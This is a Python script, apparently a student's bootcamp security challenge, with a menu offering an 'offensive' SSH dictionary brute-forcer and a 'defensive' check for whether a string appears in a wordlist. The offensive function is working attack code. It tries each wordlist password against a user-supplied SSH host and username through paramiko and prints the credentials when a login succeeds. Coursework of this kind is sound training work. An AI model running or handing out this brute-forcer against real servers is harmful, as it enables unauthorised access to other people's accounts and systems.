#!/usr/bin/env python3
# Script:                       Add to challenge 16 to authenticate to an SSH server by its IP address
# Author:                       Yue Moua
# Date of latest revision:      1/29/2024
# Purpose:                      Challenge 17

# pip install paramiko

import time
import paramiko

def offensive_mode(word_list_path, username, ip_address):
    try:
        with open(word_list_path, 'r') as file:
            for word in file:
                password = word.strip()  # Remove leading and trailing whitespaces
                try:
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(ip_address, username=username, password=password)
                    print(f"Successful login! Username: {username}, Password: {password}")
                    ssh_client.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"Failed login attempt. Username: {username}, Password: {password}")
                    time.sleep(1)  # Add a delay of 1 second between attempts
    except FileNotFoundError:
        print("File not found. Please provide a valid file path.")

def defensive_mode(user_input, word_list_path):
    try:
        with open(word_list_path, 'r', encoding='utf-8', errors='ignore') as file:
            word_list = [line.strip() for line in file]

            if user_input in word_list:
                print(f"The word '{user_input}' was found in the word list.")
            else:
                print(f"The word '{user_input}' was not found in the word list.")
    except FileNotFoundError:
        print("File not found. Please provide a valid file path.")
    except UnicodeDecodeError:
        print("Error decoding the file. Please ensure the file contains valid UTF-8 encoded text.")

def main():
    while True:
        print("\nMenu:")
        print("1. Offensive; Dictionary Iterator (SSH Authentication)")
        print("2. Defensive; Password Recognized")
        print("3. Exit")

        choice = input("Enter your choice (1-3): ")

        if choice == '3':
            print("Exiting the program. Goodbye!")
            break
        elif choice == '1':
            word_list_path = input("Enter the path of the word list file: ")
            username = input("Enter the SSH username: ")
            ip_address = input("Enter the SSH server IP address: ")
            offensive_mode(word_list_path, username, ip_address)
        elif choice == '2':
            user_input = input("Enter the string to search: ")
            word_list_path = input("Enter the path of the word list file: ")
            defensive_mode(user_input, word_list_path)
        else:
            print("Invalid choice. Please enter a number between 1 and 3.")

if __name__ == "__main__":
    main()

# REF:
# https://github.com/ymoua27/401-challenges/blob/main/ch16.py
# https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-17/challenges/DEMO.md
# https://chat.openai.com/share/9ced16a7-beb9-46ae-bf2a-87196a25881f
# https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
# https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/
